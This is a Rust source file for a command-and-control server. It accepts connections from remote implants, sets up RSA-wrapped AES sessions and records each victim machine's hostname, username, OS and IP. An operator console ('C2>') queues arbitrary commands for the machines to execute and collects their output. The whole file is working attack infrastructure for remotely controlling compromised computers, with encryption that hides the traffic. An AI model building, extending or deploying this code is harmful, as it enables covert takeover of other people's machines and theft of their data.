use anyhow::Result;
use c2_server::{
    crypto, ClientHandshakeInfo, ClientInfo, Command, CommandResult, EncryptedMessage,
    MessageType, ServerConfig, ServerState, ServerStateInner,
};
use chrono::Utc;
use colored::Colorize;
use crossterm::{
    event::{self, Event, KeyCode},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use serde_json;
use std::{
    io::{self, Read, Write},
    net::SocketAddr,
    sync::Arc,
    time::Duration,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::{TcpListener, TcpStream},
    sync::RwLock,
    time::{interval, sleep},
};
use uuid::Uuid;
use base64::{engine::general_purpose, Engine as _};

#[tokio::main]
async fn main() -> Result<()> {
    let config = ServerConfig::default();
    
    // Initialize server state
    let state_inner = ServerStateInner::new(config.clone())?;
    let state = Arc::new(RwLock::new(state_inner));
    
    println!("{}", "🚀 C2 Server Starting...".bright_green().bold());
    println!("📍 Binding to {}:{}", config.bind_address, config.bind_port);
    println!("🔐 RSA Key Size: {} bits", config.rsa_key_size);
    println!("⏰ Heartbeat Timeout: {} seconds", config.heartbeat_timeout);
    println!("{}", "━".repeat(60).bright_blue());
    
    // Start the TCP listener
    let listener = TcpListener::bind(format!("{}:{}", config.bind_address, config.bind_port)).await?;
    println!("✅ Server listening on {}:{}", config.bind_address, config.bind_port);
    
    // Spawn cleanup task
    let cleanup_state = Arc::clone(&state);
    tokio::spawn(async move {
        let mut cleanup_interval = interval(Duration::from_secs(60));
        loop {
            cleanup_interval.tick().await;
            let mut state_lock = cleanup_state.write().await;
            state_lock.cleanup_inactive_clients();
        }
    });
    
    // Spawn admin interface
    let admin_state = Arc::clone(&state);
    tokio::spawn(async move {
        admin_interface(admin_state).await;
    });
    
    // Accept incoming connections
    loop {
        match listener.accept().await {
            Ok((stream, addr)) => {
                let client_state = Arc::clone(&state);
                tokio::spawn(async move {
                    if let Err(e) = handle_client(stream, addr, client_state).await {
                        eprintln!("❌ Client handler error: {}", e);
                    }
                });
            }
            Err(e) => {
                eprintln!("❌ Failed to accept connection: {}", e);
            }
        }
    }
}

/// Handle a new client connection
async fn handle_client(mut stream: TcpStream, addr: SocketAddr, state: ServerState) -> Result<()> {
    println!("🔗 New connection from {}", addr.to_string().bright_yellow());
    
    // Perform handshake
    let client_id = match perform_handshake(&mut stream, &addr, Arc::clone(&state)).await {
        Ok(id) => {
            println!("✅ Handshake completed for client: {}", id.bright_green());
            id
        }
        Err(e) => {
            eprintln!("❌ Handshake failed for {}: {}", addr, e);
            return Err(e);
        }
    };
    
    // Main communication loop
    let mut buffer = [0u8; 8192];
    loop {
        tokio::select! {
            // Read data from client
            result = stream.read(&mut buffer) => {
                match result {
                    Ok(0) => {
                        println!("🔌 Client {} disconnected", client_id.bright_red());
                        break;
                    }
                    Ok(n) => {
                        let data = &buffer[..n];
                        if let Err(e) = handle_client_message(data, &client_id, &mut stream, Arc::clone(&state)).await {
                            eprintln!("❌ Error handling message from {}: {}", client_id, e);
                        }
                    }
                    Err(e) => {
                        eprintln!("❌ Error reading from {}: {}", client_id, e);
                        break;
                    }
                }
            }
            
            // Timeout for inactivity
            _ = sleep(Duration::from_secs(300)) => {
                println!("⏰ Client {} timed out", client_id.bright_yellow());
                break;
            }
        }
    }
    
    // Mark client as inactive
    {
        let mut state_lock = state.write().await;
        if let Some(client) = state_lock.clients.get_mut(&client_id) {
            client.is_active = false;
        }
    }
    
    Ok(())
}

/// Perform RSA key exchange handshake with client
async fn perform_handshake(
    stream: &mut TcpStream,
    addr: &SocketAddr,
    state: ServerState,
) -> Result<String> {
    // Read handshake request
    let mut buffer = [0u8; 4096];
    let n = stream.read(&mut buffer).await?;
    let handshake_data = &buffer[..n];
    
    // Parse handshake request
    let handshake_msg: MessageType = serde_json::from_slice(handshake_data)?;
    
    let client_handshake_info = match handshake_msg {
        MessageType::HandshakeRequest { client_info } => client_info,
        _ => return Err(anyhow::anyhow!("Expected handshake request")),
    };
    
    // Generate client ID
    let client_id = format!("{}_{}_{}", 
        client_handshake_info.hostname,
        client_handshake_info.username,
        Uuid::new_v4().to_string().split('-').next().unwrap()
    );
    
    // Send handshake response with public key
    let public_key_pem = {
        let state_lock = state.read().await;
        crypto::public_key_to_pem(&state_lock.rsa_public_key)?
    };
    
    let handshake_response = MessageType::HandshakeResponse {
        public_key_pem,
        server_id: "c2_server_v1.0".to_string(),
    };
    
    let response_data = serde_json::to_vec(&handshake_response)?;
    stream.write_all(&response_data).await?;
    
    // Wait for encrypted AES key
    let n = stream.read(&mut buffer).await?;
    let session_key_data = &buffer[..n];
    let session_key_msg: MessageType = serde_json::from_slice(session_key_data)?;
    
    let encrypted_aes_key = match session_key_msg {
        MessageType::SessionKey { encrypted_aes_key } => encrypted_aes_key,
        _ => return Err(anyhow::anyhow!("Expected session key")),
    };
    
    // Decrypt AES key with RSA private key
    let encrypted_key_bytes = general_purpose::STANDARD.decode(&encrypted_aes_key)?;
    let aes_key_bytes = {
        let state_lock = state.read().await;
        crypto::decrypt_rsa(&encrypted_key_bytes, &state_lock.rsa_private_key)?
    };
    
    if aes_key_bytes.len() != 32 {
        return Err(anyhow::anyhow!("Invalid AES key length"));
    }
    
    let mut aes_key = [0u8; 32];
    aes_key.copy_from_slice(&aes_key_bytes);
    
    // Store client info with session key
    let client_info = ClientInfo {
        id: client_id.clone(),
        hostname: client_handshake_info.hostname,
        username: client_handshake_info.username,
        operating_system: client_handshake_info.operating_system,
        ip_address: addr.ip().to_string(),
        first_seen: Utc::now(),
        last_seen: Utc::now(),
        is_active: true,
        session_key: Some(aes_key.to_vec()),
    };
    
    {
        let mut state_lock = state.write().await;
        state_lock.add_or_update_client(client_info);
    }
    
    // Send session acknowledgment
    let session_ack = MessageType::SessionAck {
        status: "OK".to_string(),
    };
    let ack_data = serde_json::to_vec(&session_ack)?;
    stream.write_all(&ack_data).await?;
    
    println!("🔐 Session established for client: {}", client_id.bright_green());
    Ok(client_id)
}

/// Handle encrypted messages from client
async fn handle_client_message(
    data: &[u8],
    client_id: &str,
    stream: &mut TcpStream,
    state: ServerState,
) -> Result<()> {
    // Get client's session key
    let session_key = {
        let state_lock = state.read().await;
        if let Some(client) = state_lock.clients.get(client_id) {
            client.session_key.clone()
        } else {
            return Err(anyhow::anyhow!("Client not found"));
        }
    };
    
    let session_key = session_key.ok_or_else(|| anyhow::anyhow!("No session key for client"))?;
    let mut key_array = [0u8; 32];
    key_array.copy_from_slice(&session_key);
    
    // Decrypt message
    let encrypted_message: EncryptedMessage = serde_json::from_slice(data)?;
    let decrypted_data = crypto::decrypt_aes(&encrypted_message, &key_array)?;
    let message: MessageType = serde_json::from_slice(&decrypted_data)?;
    
    match message {
        MessageType::Heartbeat { .. } => {
            // Update last seen time
            {
                let mut state_lock = state.write().await;
                if let Some(client) = state_lock.clients.get_mut(client_id) {
                    client.last_seen = Utc::now();
                }
            }
            
            // Send heartbeat ack
            let heartbeat_ack = MessageType::HeartbeatAck {
                timestamp: Utc::now(),
            };
            send_encrypted_message(stream, &heartbeat_ack, &key_array).await?;
        }
        
        MessageType::CommandRequest { .. } => {
            // Get next command for client
            let command = {
                let mut state_lock = state.write().await;
                state_lock.get_next_command(client_id)
            };
            
            let command_response = MessageType::CommandResponse { command };
            send_encrypted_message(stream, &command_response, &key_array).await?;
        }
        
        MessageType::CommandResult { result } => {
            // Store command result
            {
                let mut state_lock = state.write().await;
                state_lock.store_command_result(client_id, result.clone());
            }
            
            println!("📝 Command result from {}: {} bytes", 
                client_id.bright_cyan(), 
                result.output.len().to_string().bright_white()
            );
            
            // Send acknowledgment
            let command_ack = MessageType::CommandAck {
                command_id: result.command_id,
            };
            send_encrypted_message(stream, &command_ack, &key_array).await?;
        }
        
        _ => {
            println!("⚠️  Unknown message type from {}", client_id.bright_yellow());
        }
    }
    
    Ok(())
}

/// Send an encrypted message to client
async fn send_encrypted_message(
    stream: &mut TcpStream,
    message: &MessageType,
    session_key: &[u8; 32],
) -> Result<()> {
    let message_data = serde_json::to_vec(message)?;
    let encrypted_message = crypto::encrypt_aes(&message_data, session_key)?;
    let encrypted_data = serde_json::to_vec(&encrypted_message)?;
    stream.write_all(&encrypted_data).await?;
    Ok(())
}

/// Interactive admin interface
async fn admin_interface(state: ServerState) {
    println!("{}", "\n🎛️  Admin Interface Ready - Type 'help' for commands".bright_magenta().bold());
    
    loop {
        // Print prompt
        print!("{} ", "C2>".bright_green().bold());
        io::stdout().flush().unwrap();
        
        // Read command
        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_err() {
            continue;
        }
        
        let input = input.trim();
        if input.is_empty() {
            continue;
        }
        
        let parts: Vec<&str> = input.split_whitespace().collect();
        let command = parts[0].to_lowercase();
        
        match command.as_str() {
            "help" => {
                println!("{}", "Available commands:".bright_cyan());
                println!("  {} - List all connected clients", "clients".bright_white());
                println!("  {} - Show detailed client info", "info <client_id>".bright_white());
                println!("  {} - Execute command on client", "exec <client_id> <command>".bright_white());
                println!("  {} - Show command results for client", "results <client_id>".bright_white());
                println!("  {} - Clear results for client", "clear <client_id>".bright_white());
                println!("  {} - Exit server", "exit".bright_white());
            }
            
            "clients" => {
                let state_lock = state.read().await;
                if state_lock.clients.is_empty() {
                    println!("No clients connected.");
                } else {
                    println!("{}", "Connected Clients:".bright_cyan());
                    println!("{}", "━".repeat(80).bright_blue());
                    for client in state_lock.clients.values() {
                        let status = if client.is_active { "🟢 ACTIVE" } else { "🔴 INACTIVE" };
                        println!(
                            "{} | {} | {}@{} | {} | Last seen: {}",
                            status,
                            client.id.bright_yellow(),
                            client.username.bright_white(),
                            client.hostname.bright_white(),
                            client.operating_system.bright_cyan(),
                            client.last_seen.format("%Y-%m-%d %H:%M:%S UTC")
                        );
                    }
                }
            }
            
            "info" => {
                if parts.len() < 2 {
                    println!("Usage: info <client_id>");
                    continue;
                }
                let client_id = parts[1];
                let state_lock = state.read().await;
                if let Some(client) = state_lock.clients.get(client_id) {
                    println!("{}", format!("Client Information: {}", client_id).bright_cyan());
                    println!("  Hostname: {}", client.hostname.bright_white());
                    println!("  Username: {}", client.username.bright_white());
                    println!("  OS: {}", client.operating_system.bright_white());
                    println!("  IP: {}", client.ip_address.bright_white());
                    println!("  First seen: {}", client.first_seen.format("%Y-%m-%d %H:%M:%S UTC"));
                    println!("  Last seen: {}", client.last_seen.format("%Y-%m-%d %H:%M:%S UTC"));
                    println!("  Status: {}", if client.is_active { "🟢 ACTIVE" } else { "🔴 INACTIVE" });
                    
                    // Show pending commands
                    if let Some(commands) = state_lock.pending_commands.get(client_id) {
                        if !commands.is_empty() {
                            println!("  Pending commands: {}", commands.len().to_string().bright_yellow());
                        }
                    }
                } else {
                    println!("Client not found: {}", client_id.bright_red());
                }
            }
            
            "exec" => {
                if parts.len() < 3 {
                    println!("Usage: exec <client_id> <command>");
                    continue;
                }
                let client_id = parts[1];
                let command = parts[2..].join(" ");
                
                let command_id = {
                    let mut state_lock = state.write().await;
                    if state_lock.clients.contains_key(client_id) {
                        state_lock.queue_command(client_id, command.clone())
                    } else {
                        println!("Client not found: {}", client_id.bright_red());
                        continue;
                    }
                };
                
                println!("✅ Command queued for {}: {} (ID: {})", 
                    client_id.bright_green(), 
                    command.bright_white(),
                    command_id.bright_yellow()
                );
            }
            
            "results" => {
                if parts.len() < 2 {
                    println!("Usage: results <client_id>");
                    continue;
                }
                let client_id = parts[1];
                let state_lock = state.read().await;
                if let Some(results) = state_lock.command_results.get(client_id) {
                    if results.is_empty() {
                        println!("No results for client: {}", client_id);
                    } else {
                        println!("{}", format!("Command Results for {}: ({} results)", client_id, results.len()).bright_cyan());
                        println!("{}", "━".repeat(80).bright_blue());
                        for (i, result) in results.iter().enumerate() {
                            println!("{}. [{}] Command: {}", 
                                (i + 1).to_string().bright_yellow(),
                                result.timestamp.format("%H:%M:%S"),
                                result.command_id.bright_white()
                            );
                            if !result.output.is_empty() {
                                println!("   Output:");
                                for line in result.output.lines().take(10) {
                                    println!("   {}", line);
                                }
                                if result.output.lines().count() > 10 {
                                    println!("   ... ({} more lines)", result.output.lines().count() - 10);
                                }
                            }
                            if let Some(error) = &result.error {
                                println!("   Error: {}", error.bright_red());
                            }
                            println!();
                        }
                    }
                } else {
                    println!("No results for client: {}", client_id.bright_red());
                }
            }
            
            "clear" => {
                if parts.len() < 2 {
                    println!("Usage: clear <client_id>");
                    continue;
                }
                let client_id = parts[1];
                let mut state_lock = state.write().await;
                if state_lock.clients.contains_key(client_id) {
                    state_lock.command_results.insert(client_id.to_string(), Vec::new());
                    println!("✅ Results cleared for client: {}", client_id.bright_green());
                } else {
                    println!("Client not found: {}", client_id.bright_red());
                }
            }
            
            "exit" => {
                println!("{}", "Shutting down C2 server...".bright_red());
                std::process::exit(0);
            }
            
            _ => {
                println!("Unknown command: {}. Type 'help' for available commands.", command.bright_red());
            }
        }
    }
}
